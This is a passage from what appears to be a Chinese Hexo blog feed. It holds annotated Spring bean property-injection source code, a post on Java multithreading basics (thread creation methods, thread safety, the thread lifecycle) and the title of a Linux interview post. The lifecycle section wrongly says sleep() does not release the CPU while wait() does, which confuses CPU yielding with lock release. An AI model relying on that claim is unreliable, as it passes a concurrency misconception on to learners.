punctuation">{</span>                            filteredPds <span class="token operator">=</span> <span class="token function">filterPropertyDescriptorsForDependencyCheck</span><span class="token punctuation">(</span>bw<span class="token punctuation">,</span> mbd<span class="token punctuation">.</span>allowCaching<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        pvsToUse <span class="token operator">=</span> ibp<span class="token punctuation">.</span><span class="token function">postProcessPropertyValues</span><span class="token punctuation">(</span>pvs<span class="token punctuation">,</span> filteredPds<span class="token punctuation">,</span> bw<span class="token punctuation">.</span><span class="token function">getWrappedInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>pvsToUse <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">return</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    pvs <span class="token operator">=</span> pvsToUse<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>needsDepCheck<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>filteredPds <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                filteredPds <span class="token operator">=</span> <span class="token function">filterPropertyDescriptorsForDependencyCheck</span><span class="token punctuation">(</span>bw<span class="token punctuation">,</span> mbd<span class="token punctuation">.</span>allowCaching<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token function">checkDependencies</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> filteredPds<span class="token punctuation">,</span> pvs<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pvs <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 核心方法</span>            <span class="token function">applyPropertyValues</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> bw<span class="token punctuation">,</span> pvs<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/**     * Apply the given property values, resolving any runtime references     * to other beans in this bean factory. Must use deep copy, so we     * don't permanently modify this property.     * @param beanName the bean name passed for better exception information     * @param mbd the merged bean definition     * @param bw the BeanWrapper wrapping the target object     * @param pvs the new property values     */</span>    <span class="token comment" spellcheck="true">// 给属性赋值</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">applyPropertyValues</span><span class="token punctuation">(</span>String beanName<span class="token punctuation">,</span> BeanDefinition mbd<span class="token punctuation">,</span> BeanWrapper bw<span class="token punctuation">,</span> PropertyValues pvs<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pvs<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> bw <span class="token keyword">instanceof</span> <span class="token class-name">BeanWrapperImpl</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token punctuation">(</span><span class="token punctuation">(</span>BeanWrapperImpl<span class="token punctuation">)</span> bw<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setSecurityContext</span><span class="token punctuation">(</span><span class="token function">getAccessControlContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 可变的PropertyValues</span>        MutablePropertyValues mpvs <span class="token operator">=</span> null<span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>PropertyValue<span class="token operator">></span> original<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pvs <span class="token keyword">instanceof</span> <span class="token class-name">MutablePropertyValues</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            mpvs <span class="token operator">=</span> <span class="token punctuation">(</span>MutablePropertyValues<span class="token punctuation">)</span> pvs<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>mpvs<span class="token punctuation">.</span><span class="token function">isConverted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Shortcut: use the pre-converted values as-is.</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    bw<span class="token punctuation">.</span><span class="token function">setPropertyValues</span><span class="token punctuation">(</span>mpvs<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeansException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>                            mbd<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> <span class="token string">"Error setting property values"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            original <span class="token operator">=</span> mpvs<span class="token punctuation">.</span><span class="token function">getPropertyValueList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            original <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>pvs<span class="token punctuation">.</span><span class="token function">getPropertyValues</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        TypeConverter converter <span class="token operator">=</span> <span class="token function">getCustomTypeConverter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>converter <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            converter <span class="token operator">=</span> bw<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        BeanDefinitionValueResolver valueResolver <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanDefinitionValueResolver</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> converter<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Create a deep copy, resolving any references for values.</span>        <span class="token comment" spellcheck="true">// 深copy，解决任何对象的关联引用</span>        List<span class="token operator">&lt;</span>PropertyValue<span class="token operator">></span> deepCopy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>original<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> resolveNecessary <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>PropertyValue pv <span class="token operator">:</span> original<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>pv<span class="token punctuation">.</span><span class="token function">isConverted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                deepCopy<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pv<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token punctuation">{</span>                String propertyName <span class="token operator">=</span> pv<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                Object originalValue <span class="token operator">=</span> pv<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                Object resolvedValue <span class="token operator">=</span> valueResolver<span class="token punctuation">.</span><span class="token function">resolveValueIfNecessary</span><span class="token punctuation">(</span>pv<span class="token punctuation">,</span> originalValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                Object convertedValue <span class="token operator">=</span> resolvedValue<span class="token punctuation">;</span>                <span class="token keyword">boolean</span> convertible <span class="token operator">=</span> bw<span class="token punctuation">.</span><span class="token function">isWritableProperty</span><span class="token punctuation">(</span>propertyName<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                        <span class="token operator">!</span>PropertyAccessorUtils<span class="token punctuation">.</span><span class="token function">isNestedOrIndexedProperty</span><span class="token punctuation">(</span>propertyName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>convertible<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    convertedValue <span class="token operator">=</span> <span class="token function">convertForProperty</span><span class="token punctuation">(</span>resolvedValue<span class="token punctuation">,</span> propertyName<span class="token punctuation">,</span> bw<span class="token punctuation">,</span> converter<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// Possibly store converted value in merged bean definition,</span>                <span class="token comment" spellcheck="true">// in order to avoid re-conversion for every created bean instance.</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>resolvedValue <span class="token operator">==</span> originalValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>convertible<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        pv<span class="token punctuation">.</span><span class="token function">setConvertedValue</span><span class="token punctuation">(</span>convertedValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    deepCopy<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pv<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>convertible <span class="token operator">&amp;&amp;</span> originalValue <span class="token keyword">instanceof</span> <span class="token class-name">TypedStringValue</span> <span class="token operator">&amp;&amp;</span>                        <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>TypedStringValue<span class="token punctuation">)</span> originalValue<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isDynamic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                        <span class="token operator">!</span><span class="token punctuation">(</span>convertedValue <span class="token keyword">instanceof</span> <span class="token class-name">Collection</span> <span class="token operator">||</span> ObjectUtils<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>convertedValue<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    pv<span class="token punctuation">.</span><span class="token function">setConvertedValue</span><span class="token punctuation">(</span>convertedValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                    deepCopy<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pv<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token punctuation">{</span>                    resolveNecessary <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    deepCopy<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PropertyValue</span><span class="token punctuation">(</span>pv<span class="token punctuation">,</span> convertedValue<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mpvs <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>resolveNecessary<span class="token punctuation">)</span> <span class="token punctuation">{</span>            mpvs<span class="token punctuation">.</span><span class="token function">setConverted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Set our (possibly massaged) deep copy.</span>        <span class="token comment" spellcheck="true">// 设置深copy</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            bw<span class="token punctuation">.</span><span class="token function">setPropertyValues</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MutablePropertyValues</span><span class="token punctuation">(</span>deepCopy<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeansException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>                    mbd<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> <span class="token string">"Error setting property values"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><h3 id="4、Bean销毁"><a href="#4、Bean销毁" class="headerlink" title="4、Bean销毁"></a>4、Bean销毁</h3><p>具体方法是在AbstractBeanFactory.registerDisposableBeanIfNecessary，这里我们留在下篇的bean生命周期中在细说</p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
          <category> Spring源码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
            <tag> Spring源码 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多线程基础、一</title>
      <link href="/2020/05/24/duo-xian-cheng-ji-chu/"/>
      <url>/2020/05/24/duo-xian-cheng-ji-chu/</url>
      
        <content type="html"><![CDATA[<h2 id="一、-基础概念"><a href="#一、-基础概念" class="headerlink" title="一、 基础概念"></a>一、 基础概念</h2><h4 id="1、什么是进程"><a href="#1、什么是进程" class="headerlink" title="1、什么是进程"></a>1、什么是进程</h4><blockquote><p>进程是系统资源分配的独立实体、每个进程都拥有独立的地址空间。</p></blockquote><h4 id="2、什么是线程"><a href="#2、什么是线程" class="headerlink" title="2、什么是线程"></a>2、什么是线程</h4><blockquote><p>线程是CPU调度的——-最小单位，必须依赖进程而存在，每个线程还拥有自己的寄存器和栈</p></blockquote><h4 id="3-、Cpu时间片轮转机制"><a href="#3-、Cpu时间片轮转机制" class="headerlink" title="3.、Cpu时间片轮转机制"></a>3.、Cpu时间片轮转机制</h4><blockquote><p>cpu轮转分配时间片给线程队列，调度过程需要上下文切换</p></blockquote><h4 id="4、并发编程的利弊"><a href="#4、并发编程的利弊" class="headerlink" title="4、并发编程的利弊"></a>4、并发编程的利弊</h4><p>好处：充分利用cpu资源，加快用户响应的时间，程序模块化，异步化</p><p>弊端：可能发生线程安全问题、死锁、线程太多拖垮cpu</p><h2 id="二、什么是线程安全？"><a href="#二、什么是线程安全？" class="headerlink" title="二、什么是线程安全？"></a>二、什么是线程安全？</h2><p>在多线程环境中，能够保证程序的正确性，和我们预期是一样的，它就是线程安全的</p><ul><li><p>原子性：提供了互斥访问，同一时刻只能有一个线程对它进行操作</p></li><li><p>可见性：一个线程对主内存的修改可以及时的被其他线程观察到</p></li><li><p>有序性：在并发时，程序的执行可能会出现乱序。给人的直观感觉就是：写在前面的代码，会在后面执行。有序性问题的原因是因为程序在执行时，可能会进行指令重排，重排后的指令与原指令的顺序未必一致。</p></li></ul><h2 id="三、-如何在Java中实现线程"><a href="#三、-如何在Java中实现线程" class="headerlink" title="三、 如何在Java中实现线程"></a>三、 如何在Java中实现线程</h2><p><strong>主要有以下7种创建方式</strong></p><ol><li>继承Thread类</li></ol><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo1</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">new</span> <span class="token class-name">Demo1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ol start="2"><li>实现Runnable接口</li></ol><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo2</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Demo2 demo2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Demo2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>demo2<span class="token punctuation">,</span> <span class="token string">"t1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ol start="3"><li>实现Callable接口</li></ol><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/*** 异步获取结果*/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo3</span> <span class="token keyword">implements</span> <span class="token class-name">Callable</span><span class="token operator">&lt;</span>String<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Demo3 demo3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Demo3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FutureTask<span class="token operator">&lt;</span>String<span class="token operator">></span> futureTask <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FutureTask</span><span class="token punctuation">(</span>demo3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>futureTask<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            String result <span class="token operator">=</span> futureTask<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"result is "</span> <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" is running"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"结果"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ol start="4"><li><p>匿名内部类方式启动</p></li><li><p>Lambda方式启动</p></li><li><p>TimeTask方式启动</p></li></ol><blockquote><p>TimeTask实现了Runnable接口，Timer内部有个TimerThread继承自Thread，故实际还是Thread + Runnable</p></blockquote><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Timer timer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Timer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        timer<span class="token punctuation">.</span><span class="token function">scheduleAtFixedRate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TimerTask</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>LocalDate<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><ol start="7"><li>线程池启动多线程</li></ol><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/*** 线程池*/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo4</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**    * ExecutorService的4种方式:    * 1.ExecutorService newFixedThreadPool(5);    * 2.ExecutorService newCachedThreadPool();    * 3.ExecutorService newSingleThreadExecutor();    * 4.ScheduleExecutorService newScheduledThreadPool();    */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Thread Pool"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ExecutorService executorService <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        executorService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Demo4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="思考：用Runnable还是Thread"><a href="#思考：用Runnable还是Thread" class="headerlink" title="思考：用Runnable还是Thread"></a>思考：用Runnable还是Thread</h3><p>Java是不支持类的多重继承的，但是可以实现多个接口，所以如果需要继承其它类时，使用Runnable更好</p><h3 id="Java中的Runnable和Callable有什么不同"><a href="#Java中的Runnable和Callable有什么不同" class="headerlink" title="Java中的Runnable和Callable有什么不同"></a>Java中的Runnable和Callable有什么不同</h3><p>Runnable和Callable都代表那些要在不同的线程中执行的任务、它们的主要区别是Callable的Call()方法可以返回值和抛出异常，而Runnable的Run()方法没有这些功能</p><h2 id="五、线程的生命周期"><a href="#五、线程的生命周期" class="headerlink" title="五、线程的生命周期"></a>五、线程的生命周期</h2><p><img src="https://upload-images.jianshu.io/upload_images/21601015-40242a21a3fb8eda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="生命周期图.png"></p><p>线程的生命周期的5种状态：新建、就绪、运行、阻塞、终止</p><ul><li><p>新建（New）</p><p>线程对象创建后，便进入新建状态</p></li><li><p>就绪（Runnable）</p><p>调用线程对象的start()方法后，便处于就绪状态，此时线程等待Cpu调度执行</p></li><li><p>运行（Running）</p><p>当就绪的线程被调度并获取Cpu资源时，便进入运行状态，执行run()方法中的操作</p></li><li><p>阻塞（Blocked）</p><p>处于运行状态的线程，因为某些原因导致线程编程阻塞状态，比如执行sleep()、wait()、join()之后都会处于阻塞状态</p><p><strong>需要注意一点</strong></p><p>sleep()不会释放cpu资源，而wait将会释放cpu资源，让其它线程执行</p></li><li><p>终止（Terminated）</p></li></ul><p>  线程执行结束，或者出现异常情况导致线程提前终止，那么线程的生命周期都将结束</p><p><em><em>为了方便大家理解阻塞状态，这里在上一个图</em>，之所以没在画一起是因为放到一起会有一种很乱的感觉，不容易阅读</em></p><p><img src="https://upload-images.jianshu.io/upload_images/21601015-849c3bd5e0e5f915.png" alt="生命周期图 (1).png"></p><p><strong>下一篇：我们细说Synchonized和JMM volatile 缓存一致性</strong></p>]]></content>
      
      
      <categories>
          
          <category> 多线程并发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程基础 </tag>
            
            <tag> 并发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常见面试题总结</title>
      <link href="/2020/05/24/linux-chang-jian-mian-shi-ti-zong-jie/"/>
      <url>/2020/05/24/linux-chang-jian-mian-shi-ti-zong-jie/</url>
      
